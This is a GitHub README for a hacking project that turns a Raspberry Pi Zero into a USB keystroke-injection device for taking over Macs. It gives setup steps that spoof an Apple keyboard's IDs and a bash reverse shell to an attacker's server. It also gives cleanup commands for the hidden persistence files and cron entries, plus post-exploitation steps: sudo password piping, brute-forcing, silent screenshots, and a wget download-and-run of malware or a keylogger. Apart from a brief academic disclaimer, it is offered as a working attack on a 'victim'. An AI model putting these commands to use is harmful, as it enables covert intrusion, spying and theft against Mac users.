# Ducky Raspberry Pi Zero for Mac

[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](https://github.com/ohbriansung/usb_rubber_ducky/blob/master/LICENSE)

This is a project to convert a normal Raspberry Pi Zero into a USB Rubber Ducky using P4wnP1. There are some threads online about P4wnP1 not running on Mac but here is an introduction about how to setup so your Pi would be able to attack a Mac. Only using pure bash on victim's machine, not third party library or package installation needed. In just 30 seconds, you'd gain control to victim's machine.

![Ducky Raspberry Pi Zero](https://raw.githubusercontent.com/ohbriansung/usb_rubber_ducky/master/pi_zero_ducky/img/concept.jpg)

## Demo Video

[![Brian Ducky Raspberry Pi Zero demo](https://img.youtube.com/vi/IrasdisNsJk/0.jpg)](https://www.youtube.com/watch?v=IrasdisNsJk)

## Requirements

1. Raspberry Pi Zero
2. 8G+ Micro SD card
3. USB Cable \(A-Male to Micro B\)

## Setup

1. Download Raspbian Stretch Lite [image](https://www.raspberrypi.org/downloads/raspbian/).
2. Install image on micro SD card with [Etcher](https://www.balena.io/etcher/).
3. Boot your pi and login with default username and password.

```
username: pi
password: raspberry
```

*Use a HDML cable and a keyboard to operate instead of ssh into it, we will setup wifi connection later then you would be able to access the pi through ssh.*

4. (Optional) Change default password for a better security.
5. Connect to network using Wi-Fi or ethernet (Adapter needed).

```shell
sudo raspi-config
```

6. Download P4wnP1 package and install it. \(If newer version is not working, I have an archived version in this repository that worked when I wrote this documentation.\)

```shell
git clone --recursive https://github.com/mame82/P4wnP1
cd P4wnP1/
./install.sh
```

7. (Important) Change scripts so it will run on Mac. This is a temporarily (03/25/19) workaround solution. "open('/dev/hidg0','rb')" is not working on Mac currently so add a timeout to line 200 in P4wnP1/boot/boot_P4wnP1.

```shell
timeout 1 python -c "with open('/dev/hidg0','rb') as f:  print ord(f.read(1))"
```

8. (Important) Use Vendor ID and Product ID from a real Apple keyboard in your payload so Mac won't be asking you to setup an unknown keyboard. See example [here](https://github.com/ohbriansung/usb_rubber_ducky/blob/master/pi_zero_ducky/payloads/hid_keyboard_hello_world.txt).

```
USB_VID="0x05ac"  # Vendor ID
USB_PID="0x027b"  # Product ID
```

9. Put your payload into P4wnP1/payloads/ on your pi zero. Load the payload in "P4wnP1/setup.cfg".

```
PAYLOAD=hid_keyboard_hello_world.txt  # Add to the end of the file
```

10. Shutdown the pi zero and plug it into a Mac with USB cable mentioned [above](#requirements). Use peripheral micro USB port, not the power port. No power needed here, pi zero takes power from target machine.

```shell
sudo shutdown -h now
```

*Remember to use a usb cable with data transfer capability instead of a power supply cable.*

11. If you want to edit the payload later, plug the pi zero into your machine, connect to Wi-Fi "P4wnP1" with password "MaMe82-P4wnP1", and ssh to it.

```shell
ssh pi@172.16.0.1
```

## Create a Reverse Shell Backdoor

1. Host Netcat server on your machine.

```shell
nc -l -p 8080 -vvv
```

2. Create a descriptor on target machine. Make sure to change the IP address and port to your server. Your server must be in the same network as target unless you have a public IP that can be accessed by target machine everywhere. \(Run the descriptor in background is recommended.\)

```shell
bash -i >& /dev/tcp/YOUR_SERVER_IP/8080 0>&1
```

3. On your server, when you see a connection being created, you then have bash access to the target machine. You would be able to see the output of bash directly on your machine with the setup above.
4. In [payloads](https://github.com/ohbriansung/usb_rubber_ducky/tree/master/pi_zero_ducky/payloads) folder there is a reverse shell ducky script example. Here is the clean up script if you use my example.

```shell
rm ~/app_support.sh; rm /tmp/app_support.sh; rm ~/.ssh/rsa_pub_; rm ~/Library/.hidden/app_support.sh; rm ~/Library/Python3.65; rm /usr/local/bin/Python3.65;
echo "" | crontab - && crontab -r
```

*For a newer version of OSX, you would find out that you Mac pops out a window and you need to select OK manually. This is an improvement made by Apple for cron job. If you use the payload without cron job, you will be just fine.*

## What Now

- Rick roll prank

```shell
# One privilege of hacking Mac is we have access to AppleScript.
osascript -e 'set volume 7'
open https://www.youtube.com/watch?v=dQw4w9WgXcQ
```

- Accessing sudo privilege

```shell
echo "password" | sudo -S ls
```

*You would be able to run a background program to brute-force victim's password.*

- Take a screenshot

```shell
osascript -e 'set volume 0'
screencapture ~/a.jpg
```

- Download and run a malicious code or KeyLogger to gain further control.

```shell
wget -O /tmp/x -q -o /dev/null http://link_to_malicious_code/
chmod a+x /tmp/x
/tmp/x
```

- ~~Take a photo with Mac's webcam~~

*Apparently, Apple has a very strong security and privacy. It's nearly impossible to control hardware like webcam or mic without really operating on the machine.*

## Author and Contributors

- Chien-Yu \(Brian\) Sung
- Jordan Aldujaili
- Omar Sharif

## Disclaimer

This repository is for academic purposes, the use of this software is your responsibility.

## References

0. [Raspbian](https://www.raspberrypi.org/downloads/raspbian/)
1. [Ducky Script](https://github.com/hak5darren/USB-Rubber-…)
1. [P4wnP1](https://github.com/mame82/P4wnP1/)
1. [Reverse Shell with Bash](https://www.gnucitizen.org/blog/reverse-shell-with-bash/)
